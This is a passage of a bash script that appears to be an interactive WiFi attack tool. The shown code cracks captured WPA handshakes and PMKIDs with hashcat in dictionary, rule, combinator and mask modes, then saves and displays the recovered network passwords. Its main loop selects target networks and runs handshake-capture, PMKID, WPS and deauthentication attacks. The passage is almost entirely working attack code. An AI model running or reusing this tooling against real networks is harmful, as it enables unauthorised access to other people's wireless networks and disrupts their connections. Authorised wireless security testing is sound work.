    echo -e "${YELLOW}    Total passwords tried: $(printf "%'d" $PASSWORDS_TESTED)${NC}\n"

    # Offer next steps
    echo -e "${YELLOW}[?] What next?${NC}"
    echo -e "  ${GREEN}[1]${NC} Try different wordlists"
    echo -e "  ${GREEN}[2]${NC} Switch to hashcat"
    echo -e "  ${GREEN}[3]${NC} Download more wordlists"
    echo -e "  ${GREEN}[4]${NC} Give up"
    read -p "Choice: " next
    case $next in
        1) crack_with_aircrack "$capture_file" ;;
        2) crack_with_hashcat "$capture_file" "22000" ;;
        3) offer_download_wordlists; crack_with_aircrack "$capture_file" ;;
        *) return 1 ;;
    esac
}

crack_with_hashcat() {
    local hash_file="$1"
    local hash_type="${2:-22000}"

    # Dependency check
    if ! command -v hashcat &>/dev/null; then
        echo -e "${RED}[!] Hashcat not installed${NC}"
        echo -e "${YELLOW}[*] Install with: sudo apt-get install hashcat${NC}\n"
        echo -e "${YELLOW}[?] Fall back to aircrack-ng? [Y/n]:${NC} \c"
        read -r fb
        [[ ! "$fb" =~ ^[Nn]$ ]] && crack_with_aircrack "$hash_file"
        return 1
    fi

    echo -e "\n${BLUE}[*] Cracking with Hashcat...${NC}\n"

    # Show device info so user knows if GPU is available
    echo -e "${YELLOW}[*] Available compute devices:${NC}"
    hashcat -I 2>/dev/null | grep -E "Device|Type|Name" | sed 's/^/    /'
    echo ""

    # Check potfile — password may already be cracked from a previous session
    local potfile="$SESSION_DIR/results/hashcat.pot"
    if [ -f "$potfile" ] && [ -s "$potfile" ]; then
        echo -e "${YELLOW}[*] Checking potfile for existing results...${NC}"
        local pot_result
        pot_result=$(hashcat -m "$hash_type" "$hash_file" \
            --potfile-path="$potfile" --show 2>/dev/null | head -1)
        if [ -n "$pot_result" ]; then
            local password
            password=$(echo "$pot_result" | awk -F: '{print $NF}')
            echo -e "${GREEN}[+] Password already cracked in previous session!${NC}"
            echo -e "    ${CYAN}Password: $password${NC}\n"
            _save_hashcat_result "$password" "potfile" "0"
            return 0
        fi
    fi

    # Common hashcat flags used across all modes
    local base_flags=(
        -m "$hash_type"
        --potfile-path="$potfile"
        -o "$SESSION_DIR/results/hashcat_found.txt"
        --status
        --status-timer=10
        --force
    )

    # Attack mode selection
    echo -e "${BLUE}[*] Select attack mode:${NC}"
    echo -e "  ${GREEN}[1]${NC} Dictionary          — wordlist only"
    echo -e "  ${GREEN}[2]${NC} Dictionary + rules  — wordlist with mutations (best64)"
    echo -e "  ${GREEN}[3]${NC} Combinator          — combine two wordlists"
    echo -e "  ${GREEN}[4]${NC} Mask / brute force  — pattern based"
    echo -e "  ${GREEN}[0]${NC} Back\n"
    read -p "Select [0-4]: " attack_mode

    local start end elapsed password

    case $attack_mode in

        0) return 0 ;;

        # ── Dictionary ────────────────────────────────────────────
        1)
            _hashcat_select_wordlists || return 1
            echo -e "\n${CYAN}[*] Running dictionary attack...${NC}\n"
            start=$(date +%s)
            for wordlist in "${SELECTED_WORDLISTS[@]}"; do
                echo -e "${YELLOW}  → $(basename "$wordlist")${NC}"
                hashcat "${base_flags[@]}" -a 0 "$hash_file" "$wordlist"
                _hashcat_check_result && return 0
            done
            ;;

        # ── Dictionary + rules ────────────────────────────────────
        2)
            _hashcat_select_wordlists || return 1

            # Pick rule file
            local rule_file="/usr/share/hashcat/rules/best64.rule"
            echo -e "\n${YELLOW}[*] Available rule files:${NC}"
            local rules=()
            while IFS= read -r -d '' r; do
                rules+=("$r")
            done < <(find /usr/share/hashcat/rules/ -name "*.rule" -print0 2>/dev/null)

            for i in "${!rules[@]}"; do
                printf "  ${GREEN}[%s]${NC} %s\n" "$((i+1))" "$(basename "${rules[$i]}")"
            done
            echo -e "  ${GREEN}[0]${NC} Use best64.rule (recommended)\n"
            read -p "Select rule [0-${#rules[@]}]: " rule_choice

            if [[ "$rule_choice" =~ ^[0-9]+$ ]] && \
               [ "$rule_choice" -ge 1 ] && \
               [ "$rule_choice" -le "${#rules[@]}" ]; then
                rule_file="${rules[$((rule_choice-1))]}"
            fi

            echo -e "\n${CYAN}[*] Running dictionary + rules attack ($(basename "$rule_file"))...${NC}\n"
            start=$(date +%s)
            for wordlist in "${SELECTED_WORDLISTS[@]}"; do
                echo -e "${YELLOW}  → $(basename "$wordlist") + $(basename "$rule_file")${NC}"
                hashcat "${base_flags[@]}" -a 0 "$hash_file" "$wordlist" \
                    -r "$rule_file"
                _hashcat_check_result && return 0
            done
            ;;

        # ── Combinator ────────────────────────────────────────────
        3)
            if [ ${#WORDLISTS[@]} -lt 2 ]; then
                echo -e "${RED}[!] Need at least 2 wordlists for combinator attack${NC}"
                return 1
            fi
            echo -e "\n${YELLOW}[*] Select first wordlist:${NC}"
            _hashcat_select_wordlists 1 || return 1
            local wl1="${SELECTED_WORDLISTS[0]}"

            echo -e "\n${YELLOW}[*] Select second wordlist:${NC}"
            _hashcat_select_wordlists 1 || return 1
            local wl2="${SELECTED_WORDLISTS[0]}"

            echo -e "\n${CYAN}[*] Running combinator attack...${NC}\n"
            start=$(date +%s)
            hashcat "${base_flags[@]}" -a 1 "$hash_file" "$wl1" "$wl2"
            _hashcat_check_result && return 0
            ;;

        # ── Mask / brute force ────────────────────────────────────
        4)
            echo -e "\n${YELLOW}[*] Common mask patterns:${NC}"
            echo -e "  ${GREEN}[1]${NC} ?d?d?d?d?d?d?d?d     — 8 digits"
            echo -e "  ${GREEN}[2]${NC} ?l?l?l?l?l?l?l?l     — 8 lowercase"
            echo -e "  ${GREEN}[3]${NC} ?u?l?l?l?l?l?d?d     — Capital + 6 letters + 2 digits"
            echo -e "  ${GREEN}[4]${NC} ?d?d?d?d?d?d?d?d?d?d — 10 digits (phone numbers)"
            echo -e "  ${GREEN}[5]${NC} Custom mask\n"
            read -p "Select [1-5]: " mask_choice

            local mask
            case $mask_choice in
                1) mask="?d?d?d?d?d?d?d?d" ;;
                2) mask="?l?l?l?l?l?l?l?l" ;;
                3) mask="?u?l?l?l?l?l?d?d" ;;
                4) mask="?d?d?d?d?d?d?d?d?d?d" ;;
                5) read -p "Enter mask: " mask ;;
                *) echo -e "${RED}[!] Invalid${NC}"; return 1 ;;
            esac

            echo -e "\n${CYAN}[*] Running mask attack: $mask${NC}\n"
            start=$(date +%s)
            hashcat "${base_flags[@]}" -a 3 "$hash_file" "$mask"
            _hashcat_check_result && return 0
            ;;

        *)
            echo -e "${RED}[!] Invalid selection${NC}"
            crack_with_hashcat "$hash_file" "$hash_type"
            return
            ;;
    esac

    end=$(date +%s)
    elapsed=$((end - ${start:-end}))
    echo -e "\n${RED}[!] Password not found${NC}"
    echo -e "${YELLOW}    Time elapsed: ${elapsed}s${NC}\n"

    echo -e "${YELLOW}[?] What next?${NC}"
    echo -e "  ${GREEN}[1]${NC} Try different attack mode"
    echo -e "  ${GREEN}[2]${NC} Download more wordlists"
    echo -e "  ${GREEN}[3]${NC} Give up"
    read -p "Choice: " next
    case $next in
        1) crack_with_hashcat "$hash_file" "$hash_type" ;;
        2) offer_download_wordlists; crack_with_hashcat "$hash_file" "$hash_type" ;;
        *) return 1 ;;
    esac
}

# ── Helpers ───────────────────────────────────────────────────────────────────

_hashcat_select_wordlists() {
    local max_select="${1:-}"  # optional: limit to N selections

    echo -e "\n${YELLOW}[*] Available wordlists:${NC}\n"
    for i in "${!WORDLISTS[@]}"; do
        local lines
        lines=$(wc -l < "${WORDLISTS[$i]}" 2>/dev/null)
        printf "  ${GREEN}[%s]${NC} %-30s ${CYAN}%s passwords${NC}\n" \
            "$((i+1))" "$(basename "${WORDLISTS[$i]}")" \
            "$(printf "%'d" "$lines")"
    done
    echo -e "  ${GREEN}[a]${NC} All\n"
    read -p "Select (comma separated): " wl_input

    SELECTED_WORDLISTS=()
    if [[ "$wl_input" =~ ^[Aa]$ ]]; then
        SELECTED_WORDLISTS=("${WORDLISTS[@]}")
    else
        IFS=',' read -ra choices <<< "$wl_input"
        for choice in "${choices[@]}"; do
            choice="${choice// /}"
            if [[ "$choice" =~ ^[0-9]+$ ]] && \
               [ "$choice" -ge 1 ] && \
               [ "$choice" -le "${#WORDLISTS[@]}" ]; then
                SELECTED_WORDLISTS+=("${WORDLISTS[$((choice-1))]}")
                [ -n "$max_select" ] && \
                [ "${#SELECTED_WORDLISTS[@]}" -ge "$max_select" ] && break
            fi
        done
    fi

    [ ${#SELECTED_WORDLISTS[@]} -eq 0 ] && {
        echo -e "${RED}[!] No valid wordlists selected${NC}"
        return 1
    }
}

_hashcat_check_result() {
    local found_file="$SESSION_DIR/results/hashcat_found.txt"
    [ -f "$found_file" ] && [ -s "$found_file" ] || return 1

    local result
    result=$(tail -1 "$found_file")
    local password
    password=$(echo "$result" | awk -F: '{print $NF}')
    local end elapsed
    end=$(date +%s)
    elapsed=$((end - ${start:-end}))

    echo -e "\n${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                 PASSWORD FOUND!                        ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}"
    echo -e "  ${CYAN}Network:  ${NC}$TARGET_ESSID"
    echo -e "  ${CYAN}BSSID:    ${NC}$TARGET_BSSID"
    echo -e "  ${CYAN}Password: ${GREEN}$password${NC}"
    echo -e "  ${CYAN}Time:     ${NC}${elapsed}s\n"

    _save_hashcat_result "$password" "hashcat" "$elapsed"
    return 0
}

_save_hashcat_result() {
    local password="$1" method="$2" elapsed="$3"
    {
        echo "Network:  $TARGET_ESSID"
        echo "BSSID:    $TARGET_BSSID"
        echo "Password: $password"
        echo "Method:   $method"
        echo "Time:     ${elapsed}s"
        echo "Date:     $(date)"
    } > "$SESSION_DIR/results/password.txt"
    log_action "PASSWORD FOUND: $password ($method, ${elapsed}s)"
}

show_session_summary() {
    # Guard against START_TIME not being set
    local end_time
    end_time=$(date +%s)
    local elapsed=$(( end_time - ${START_TIME:-end_time} ))
    local hours=$(( elapsed / 3600 ))
    local minutes=$(( (elapsed % 3600) / 60 ))
    local seconds=$(( elapsed % 60 ))

    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              SESSION SUMMARY                           ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════╝${NC}\n"

    # Target info — only show if we actually had a target
    if [ -n "$TARGET_BSSID" ]; then
        echo -e "${CYAN}Target Network:${NC}"
        echo -e "  ESSID:      ${TARGET_ESSID:-(unknown)}"
        echo -e "  BSSID:      $TARGET_BSSID"
        echo -e "  Channel:    ${TARGET_CHANNEL:--}"
        echo -e "  Encryption: ${TARGET_ENC:--}"
        echo ""
    fi

    echo -e "${CYAN}Attack Results:${NC}"
    [ "$HANDSHAKE_CAPTURED" = true ] \
        && echo -e "  ${GREEN}✓${NC} Handshake captured" \
        || echo -e "  ${RED}✗${NC} Handshake not captured"
    [ "$PMKID_CAPTURED" = true ] \
        && echo -e "  ${GREEN}✓${NC} PMKID captured" \
        || echo -e "  ${RED}✗${NC} PMKID not captured"
    [ "$WPS_SUCCESS" = true ] \
        && echo -e "  ${GREEN}✓${NC} WPS PIN found" \
        || echo -e "  ${RED}✗${NC} WPS not successful"
    echo ""

    echo -e "${CYAN}Statistics:${NC}"
    echo -e "  Session time:      ${hours}h ${minutes}m ${seconds}s"
    echo -e "  Passwords tested:  $(printf "%'d" "${PASSWORDS_TESTED:-0}")"
    [ -n "$SESSION_DIR" ] && \
        echo -e "  Files saved to:    ${GREEN}$SESSION_DIR${NC}"
    echo ""

    # Password found — show prominently
    if [ -n "$SESSION_DIR" ] && [ -f "$SESSION_DIR/results/password.txt" ]; then
        echo -e "${GREEN}╔════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                 PASSWORD RECOVERED!                    ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════════════════════╝${NC}\n"
        while IFS= read -r line; do
            echo -e "  ${CYAN}$line${NC}"
        done < "$SESSION_DIR/results/password.txt"
        echo ""
    fi

    # Result files — use find instead of ls parsing
    if [ -n "$SESSION_DIR" ] && [ -d "$SESSION_DIR/results" ]; then
        local result_files=()
        while IFS= read -r -d '' f; do
            result_files+=("$f")
        done < <(find "$SESSION_DIR/results" -maxdepth 1 -type f -print0 2>/dev/null)

        if [ ${#result_files[@]} -gt 0 ]; then
            echo -e "${CYAN}Result files:${NC}"
            for f in "${result_files[@]}"; do
                local size
                size=$(du -sh "$f" 2>/dev/null | cut -f1)
                echo -e "  ${GREEN}$(basename "$f")${NC} ${CYAN}($size)${NC}"
            done
            echo ""
        fi
    fi
}

main_workflow() {
    show_banner
    show_legal_warning
    check_dependencies
    create_session_dir

    # Interface setup
    select_interface
    enable_monitor_mode

    # Network scanning
    if ! scan_networks; then
        echo -e "${RED}[!] No networks found — exiting${NC}"
        # Don't call full cleanup here, nothing to summarize
        airmon-ng stop "$MONITOR_INTERFACE" >/dev/null 2>&1
        systemctl restart NetworkManager 2>/dev/null
        exit 1
    fi

    select_target

    # Attack loop — keep going until user is done or something is captured
    while true; do
        show_attack_menu

        if [ "$ATTACK_MODE" = "handshake_capture" ]; then
            attack_handshake_capture
        elif [ "$ATTACK_MODE" = "pmkid_attack" ]; then
            attack_pmkid
        elif [ "$ATTACK_MODE" = "wps_attack" ]; then
            attack_wps
        elif [ "$ATTACK_MODE" = "deauth_attack" ]; then
            attack_deauth
            # Deauth doesn't capture anything — loop back to menu
            echo -e "${YELLOW}[*] Deauth complete — returning to attack menu${NC}"
            continue
        fi

        # If we have something to crack, offer cracking
        if [ "$HANDSHAKE_CAPTURED" = true ] || \
           [ "$PMKID_CAPTURED" = true ] || \
           [ "$WPS_SUCCESS" = true ]; then

            if [ "$WPS_SUCCESS" != true ]; then
                echo -e "\n${YELLOW}[?] Proceed with password cracking? [Y/n]:${NC} \c"
                read -r crack_choice
                if [[ ! "$crack_choice" =~ ^[Nn]$ ]]; then
                    setup_wordlists
                    crack_with_wordlists
                fi
            fi

            # Ask if user wants to attack a different target
            echo -e "\n${YELLOW}[?] What would you like to do next?${NC}"
            echo -e "  ${GREEN}[1]${NC} Attack same target again"
            echo -e "  ${GREEN}[2]${NC} Choose a different target"
            echo -e "  ${GREEN}[3]${NC} Finish session"
            read -p "Choice: " next_action

            case $next_action in
                1) continue ;;
                2)
                    # Reset capture flags for new target
                    HANDSHAKE_CAPTURED=false
                    PMKID_CAPTURED=false
                    WPS_SUCCESS=false
                    select_target
                    continue
                    ;;
                *) break ;;
            esac
        fi

        # Nothing captured — ask what to do
        echo -e "\n${YELLOW}[?] Nothing captured. What next?${NC}"
        echo -e "  ${GREEN}[1]${NC} Try another attack on same target"
        echo -e "  ${GREEN}[2]${NC} Choose a different target"
        echo -e "  ${GREEN}[3]${NC} Finish session"
        read -p "Choice: " next_action

        case $next_action in
            2)
                HANDSHAKE_CAPTURED=false
                PMKID_CAPTURED=false
                WPS_SUCCESS=false
                select_target
                ;;
            3) break ;;
        esac
    done

    cleanup
}

# Entry point
check_root
main_workflow